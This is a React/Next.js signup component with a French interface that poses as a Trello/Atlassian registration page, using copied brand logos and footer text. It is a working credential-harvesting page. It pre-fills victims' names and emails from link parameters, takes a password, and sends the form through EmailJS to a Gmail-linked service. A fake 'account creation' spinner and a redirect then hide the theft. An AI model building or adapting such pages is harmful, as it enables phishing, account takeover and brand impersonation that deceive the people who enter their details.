import React, { useState, useEffect, useRef } from 'react';
import emailjs from 'emailjs-com';
import { useRouter } from 'next/router';

export default function Signup() {
  const firstNameRef = useRef(null);
  const lastNameRef = useRef(null);
  const emailRef = useRef(null);
  const phoneRef = useRef(null);
  const formRef = useRef(null); // Add a ref for the form element
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isBackgroundVisible, setIsBackgroundVisible] = useState(true);
  const router = useRouter();

  useEffect(() => {
    emailjs.init("p7vtRytijMovXPfFA");

    // Get URL parameters
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    const surname = params.get('surname');
    const email = params.get('mail');
    const phone = params.get('phone');

    // Pre-fill form fields
    if (name) firstNameRef.current.value = name;
    if (surname) lastNameRef.current.value = surname;
    if (email) emailRef.current.value = email;
    if (phone) phoneRef.current.value = phone;
  }, []);

  const sendEmail = (event) => {
    event.preventDefault();
    emailjs.sendForm('gmail-alexandree', 'new-registration', formRef.current, 'p7vtRytijMovXPfFA') // Use formRef.current
      .then(() => {
        console.log('SUCCESS!');
        // document.querySelector('.left-column').style.display = 'none';
        // document.querySelector('.right-column').style.width = '100%';
        // document.querySelector('.right-column').style.maxWidth = 'none';

        showStep(2); // Move to the confirmation step after successful email sending
      })
      .catch((error) => {
        console.log('FAILED...', error);
      });
  };

  //fonction pour cacher un élément et en afficher un autre :
  function showStep(step) {
    if (typeof document !== 'undefined') {
      const steps = document.querySelectorAll('.checkout-step');
      steps.forEach(s => s.classList.remove('active'));
      steps[step].classList.add('active');
    }
  }

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleCreateAccount = (e) => {

    //verify if each input filled
    if (!emailRef.current.value || !firstNameRef.current.value || !lastNameRef.current.value || !password) {
      alert('Veuillez remplir tous les champs');
      return;
    }

    e.preventDefault();
    setIsLoading(true);
    setIsBackgroundVisible(true); // Assurez-vous que la div d'arrière-plan reste visible

    // Store first name and last name in session storage
    sessionStorage.setItem('firstName', firstNameRef.current.value);
    sessionStorage.setItem('lastName', lastNameRef.current.value);

    sendEmail(e);
    setTimeout(() => {
      router.push(`/dashboard`);
    }, 5000);
  };

  const isMinLength = password.length >= 8;
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  const hasNumber = /\d/.test(password);

  return (
    <div className='container'>
      <img className='img-1' src='/bg-img1.png'/>
      <img className='img-2' src='/bg-img2.png'/>

      <article> 
        <svg className='logo' viewBox="0 0 94 32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true">
          <defs>
            <linearGradient id="uid6" x1="9.33821" y1="23.6824" x2="9.33821" y2="5.00599" gradientUnits="userSpaceOnUse">
              <stop stop-color="#0052CC" offset="0%"></stop>
              <stop stop-color="#2684FF" offset="100%"></stop>
            </linearGradient>
          </defs>
          <path fill="var(--ds-text, #172B4D)" fill-rule="evenodd" clip-rule="evenodd" d="M68.749 23.7902C66.249 23.7902 64.6742 22.5776 64.6742 19.7573V5H68.5155V19.2304C68.5155 20.0477 69.0574 20.3381 69.7131 20.3381C69.9021 20.3421 70.0911 20.3331 70.2789 20.3112V23.6315C69.7788 23.7552 69.2639 23.8086 68.749 23.7902ZM38.7121 9.98505V6.37431H26.0297V9.98505H30.3051V23.6825H34.4308V9.98505H38.7121ZM40.1498 23.6825H43.9641V16.6227C43.9641 14.464 45.2276 13.8053 47.9072 14.0149V10.027C45.8443 9.89522 44.6856 10.973 43.9641 12.7904V10.2096H40.1498V23.6825ZM72.6901 19.7573C72.6901 22.5776 74.2619 23.7902 76.7619 23.7902C77.2787 23.809 77.7957 23.7556 78.2978 23.6315V20.3112C78.109 20.333 77.9189 20.342 77.7289 20.3381C77.0732 20.3381 76.5313 20.0477 76.5313 19.2304V5H72.6901V19.7573ZM80.1444 16.9402C80.1444 12.7786 82.5396 9.93129 86.6653 9.93129C90.791 9.93129 93.1353 12.7845 93.1353 16.9402C93.1353 21.0958 90.764 24 86.6653 24C82.5665 24 80.1444 21.0749 80.1444 16.9402ZM83.8809 16.9402C83.8809 18.9701 84.7312 20.5749 86.6653 20.5749C88.5994 20.5749 89.3988 18.9701 89.3988 16.9402C89.3988 14.9103 88.5724 13.3474 86.6653 13.3474C84.7581 13.3474 83.8959 14.9103 83.8959 16.9402H83.8809ZM56.2777 18.3621C55.2023 18.3538 54.1281 18.2909 53.0592 18.1734C53.4124 20.0986 54.8256 20.7692 56.8795 20.7692C58.4004 20.7692 59.8854 20.3501 61.1998 19.9309V23.1734C59.7762 23.7133 58.2642 23.9824 56.7417 23.9668C51.6131 23.9668 49.3436 21.4009 49.3436 17.0806C49.3436 12.934 51.9723 9.94 56.0801 9.94C59.1309 9.94 61.6668 12.0058 61.6668 14.7513C61.6668 17.5776 59.1968 18.3621 56.2777 18.3621ZM57.9513 14.6166C57.9513 13.6136 57.0831 12.8801 56.0022 12.8801L55.9992 12.8711C55.4963 12.8789 55.0046 13.0206 54.5746 13.2816C54.1447 13.5426 53.7921 13.9135 53.5532 14.3561C53.2546 14.9118 53.0751 15.5236 53.0262 16.1525C53.686 16.2551 54.3525 16.3081 55.0202 16.3112C56.5861 16.3112 57.9513 15.91 57.9513 14.6166Z"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M16.4579 5H2.21854C1.63014 5 1.06585 5.23374 0.649794 5.64979C0.233738 6.06585 0 6.63014 0 7.21854V21.4669C0 22.0553 0.233738 22.6196 0.649794 23.0356C1.06585 23.4517 1.63014 23.6854 2.21854 23.6854H16.4579C17.0463 23.6854 17.6106 23.4517 18.0266 23.0356C18.4427 22.6196 18.6764 22.0553 18.6764 21.4669V7.22452C18.6772 6.93268 18.6204 6.64354 18.5093 6.37369C18.3981 6.10383 18.2348 5.85855 18.0287 5.65191C17.8227 5.44527 17.5778 5.28131 17.3083 5.16945C17.0387 5.05758 16.7497 5 16.4579 5V5ZM8.04481 18.4729C8.04481 18.6685 7.96731 18.8561 7.82927 18.9947C7.69123 19.1333 7.50391 19.2116 7.30829 19.2124H4.18558C3.98969 19.2116 3.80205 19.1334 3.66353 18.9949C3.52502 18.8564 3.44685 18.6688 3.44607 18.4729V9.19157C3.44685 8.99568 3.52502 8.80804 3.66353 8.66952C3.80205 8.53101 3.98969 8.45284 4.18558 8.45205H7.30829C7.50391 8.45285 7.69123 8.53111 7.82927 8.66971C7.96731 8.80831 8.04481 8.99595 8.04481 9.19157V18.4729ZM15.2304 14.2185C15.2296 14.4143 15.1514 14.602 15.0129 14.7405C14.8744 14.879 14.6867 14.9572 14.4908 14.958H11.3681C11.1725 14.9572 10.9852 14.8789 10.8471 14.7403C10.7091 14.6017 10.6316 14.4141 10.6316 14.2185V9.19157C10.6316 8.99595 10.7091 8.80831 10.8471 8.66971C10.9852 8.53111 11.1725 8.45285 11.3681 8.45205H14.4908C14.6867 8.45284 14.8744 8.53101 15.0129 8.66952C15.1514 8.80804 15.2296 8.99568 15.2304 9.19157V14.2185Z" fill="url(#uid6)"></path>
        </svg>

        {isLoading && (
        <div className="loading-wrapper">
            <h1>Création du compte</h1>
            <p>Veuillez patienter quelques instants<br/> vous allez être redirigé.</p>
            <div className="spinner"></div>
        </div>
      )}

        <h1>Inscrivez-vous pour rejoindre ce tableau </h1>
        <form className="checkout-form" onSubmit={sendEmail} ref={formRef}> {/* Add ref to the form */}
          <input type="hidden" name="website" value='collective-partners' />

          <div className='checkout-step active'>
            <label>
              <input type="text" name="email" placeholder="Adresse e-mail" ref={emailRef} required/>
            </label>
            <div className="form-row">
              <label>
                <input type="text" name="firstName" placeholder="Prénom" ref={firstNameRef} required/>
              </label>
              <label>
                <input type="text" name="lastName" placeholder="Nom" ref={lastNameRef} required/>
              </label>
            </div>
            <label>
              <input 
                type="password" 
                name="password" 
                placeholder="***********" 
                value={password} 
                onChange={handlePasswordChange} 
                required
              />
              <ul className='pass-row'>
                <li className={isMinLength ? 'completed' : ''}><span>•</span> 8 caractères min.</li>
                <li className={hasSpecialChar ? 'completed' : ''}><span>•</span> 1 caractère spécial</li>
                <li className={hasNumber ? 'completed' : ''}><span>•</span> 1 chiffre</li>
              </ul>
            </label>
            <button type="submit" id="delivery-checkout" onClick={handleCreateAccount}>S'inscrire</button>
          </div>
        <hr/>
        <svg className='logo footer' viewBox="0 0 190 32" height="32" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true">
        <defs>
          <linearGradient x1="99.684716%" y1="15.8138128%" x2="39.8444399%" y2="97.4388388%" id="uid7">
            <stop stop-color="#344563" offset="0%"></stop>
            <stop stop-color="#7A869A" offset="100%"></stop>
          </linearGradient>
        </defs>
        <g stroke="none" stroke-width="1" fill="#505F79">
          <path fill="url(#uid7)" d="M6.90502605,15.6123193 C6.76436383,15.4302139 6.53773035,15.3340846 6.30742588,15.35884 C6.0771214,15.3835955 5.876643,15.525635 5.7787929,15.7333781 L0.0719979599,27.0218487 C-0.0337056449,27.2310259 -0.0224063827,27.4794358 0.101860917,27.6783741 C0.226128216,27.8773125 0.445645594,27.9984148 0.68202605,27.9984369 L8.62844459,27.9984369 C8.88847261,28.0044096 9.12761649,27.8581627 9.23847268,27.6253781 C10.9526159,24.1210252 9.91378448,18.7926722 6.90502605,15.6123193 Z"></path>
          <path fill="#7A869A" d="M11.0859556,5.33713587 C8.19309829,9.74089822 7.85921851,15.3267488 10.2073011,20.0371359 L14.0383488,27.6176065 C14.1538739,27.8462194 14.3900332,27.9906411 14.6483769,27.9906653 L22.5933685,27.9906653 C22.829749,27.9906431 23.0492663,27.8695408 23.1735336,27.6706025 C23.2978009,27.4716641 23.3091002,27.2232543 23.2033966,27.014077 C23.2033966,27.014077 12.5147056,5.8619594 12.2460792,5.33290058 C12.1377032,5.11315026 11.9118188,4.97410225 11.6646746,4.97500451 C11.4175304,4.97590676 11.1926893,5.11660025 11.0859556,5.33713587 L11.0859556,5.33713587 Z"></path>
          <path d="M104.2774,14.3919316 C104.2774,17.1872257 105.588069,19.4065198 110.714802,20.3862846 C113.773504,21.0215787 114.414212,21.5100493 114.414212,22.5187551 C114.414212,23.4985198 113.772077,24.1327551 111.617715,24.1327551 C109.013896,24.0864379 106.462135,23.403307 104.189999,22.1442846 L104.189999,26.6972257 C105.733976,27.4465198 107.772754,28.2822846 111.559566,28.2822846 C116.919251,28.2822846 119.045788,25.9175787 119.045788,22.4033434 M119.045788,22.4033434 C119.045788,19.0892257 117.268858,17.5327551 112.25878,16.4668728 C109.491535,15.8615787 108.821574,15.2566375 108.821574,14.3919316 C108.821574,13.297814 109.811889,12.835814 111.646968,12.835814 C113.860906,12.835814 116.045591,13.4986375 118.113622,14.4208728 L118.113622,10.0691081 C116.130615,9.17615406 113.970906,8.73311319 111.792518,8.7724022 C106.840589,8.7724022 104.2774,10.9048728 104.2774,14.3919316" fill="inherit"></path>
          <polygon fill="inherit" points="173.129997 9.07000017 173.129997 28.0038825 177.20791 28.0038825 177.20791 13.5657649 178.926691 17.3983531 184.694132 28.0038825 189.820865 28.0038825 189.820865 9.07000017 185.742952 9.07000017 185.742952 21.2891766 184.198975 17.7442355 179.567399 9.07000017"></polygon>
          <rect fill="inherit" x="142.740005" y="9.07000017" width="4.45677247" height="18.9338824"></rect>
          <path d="M137.600792,22.4033434 C137.600792,19.0892257 135.823862,17.5327551 130.813784,16.4668728 C128.046539,15.8615787 127.376579,15.2566375 127.376579,14.3919316 C127.376579,13.297814 128.366893,12.835814 130.201972,12.835814 C132.41591,12.835814 134.600595,13.4986375 136.668626,14.4208728 L136.668626,10.0691081 C134.685619,9.17615406 132.52591,8.73311319 130.347522,8.7724022 C125.395593,8.7724022 122.832404,10.9048728 122.832404,14.3919316 C122.832404,17.1872257 124.143073,19.4065198 129.269806,20.3862846 C132.328508,21.0215787 132.969216,21.5100493 132.969216,22.5187551 C132.969216,23.4985198 132.327081,24.1327551 130.172719,24.1327551 C127.568901,24.0864379 125.017139,23.403307 122.745003,22.1442846 L122.745003,26.6972257 C124.28898,27.4465198 126.327758,28.2822846 130.11457,28.2822846 C135.474256,28.2822846 137.600792,25.9175787 137.600792,22.4033434" fill="inherit"></path>
          <polygon fill="inherit" points="69.6599979 9.07000017 69.6599979 28.0038825 78.8204081 28.0038825 80.2627142 23.9115296 74.1456665 23.9115296 74.1456665 9.07000017"></polygon>
          <polygon fill="inherit" points="51.5549984 9.07000017 51.5549984 13.1620002 56.5069282 13.1620002 56.5069282 28.0038825 60.9925967 28.0038825 60.9925967 13.1620002 66.2941332 13.1620002 66.2941332 9.07000017"></polygon>
          <path d="M45.0573091,9.07000017 L39.1785647,9.07000017 L32.5050001,28.0038825 L37.6014102,28.0038825 L38.5474889,24.815059 C40.877531,25.4919503 43.3551322,25.4919503 45.6851743,24.815059 L46.6312529,28.0038825 L51.7287333,28.0038825 L45.0573091,9.07000017 Z M42.1177585,21.4007061 C41.287584,21.4006584 40.4616854,21.2831148 39.6651602,21.0516472 L42.1177585,12.7889413 L44.5703569,21.0544708 C43.7736914,21.2849831 42.9477956,21.4015755 42.1177585,21.4007061 L42.1177585,21.4007061 Z" fill="inherit"></path>
          <path d="M94.6019534,9.07000017 L88.7235658,9.07000017 L82.0500011,28.0038825 L87.1474815,28.0038825 L88.0935601,24.815059 C90.4236023,25.4919503 92.9012034,25.4919503 95.2312455,24.815059 L96.1773242,28.0038825 L101.274805,28.0038825 L94.6019534,9.07000017 Z M91.6627596,21.4007061 C90.8325851,21.4006584 90.0066865,21.2831148 89.2101613,21.0516472 L91.6627596,12.7889413 L94.1153579,21.0544708 C93.3186924,21.2849831 92.4927966,21.4015755 91.6627596,21.4007061 L91.6627596,21.4007061 Z" fill="inherit"></path>
          <path d="M163.256954,9.07000017 L157.378566,9.07000017 L150.705002,28.0038825 L155.802482,28.0038825 L156.748561,24.815059 C159.078603,25.4919503 161.556204,25.4919503 163.886246,24.815059 L164.832325,28.0038825 L169.930162,28.0038825 L163.256954,9.07000017 Z M160.315977,21.4007061 C159.485802,21.4006584 158.659903,21.2831148 157.863378,21.0516472 L160.315977,12.7889413 L162.768575,21.0544708 C161.971909,21.2849831 161.146014,21.4015755 160.315977,21.4007061 L160.315977,21.4007061 Z" fill="inherit"></path>
        </g>
        </svg>
        <p className='notice footer'>One account for Trello, Jira, Confluence and <a href='https://support.atlassian.com/atlassian-account/docs/what-is-an-atlassian-account/' target="_blank">more</a></p>
        <p className='notice footer'>This site is protected by reCAPTCHA and the Google <a href='https://policies.google.com/privacy'>Privacy Policy</a> and <a href='https://policies.google.com/terms'>Terms of Service</a> apply. </p>
      
        </form>
      </article>
    </div>
  );
};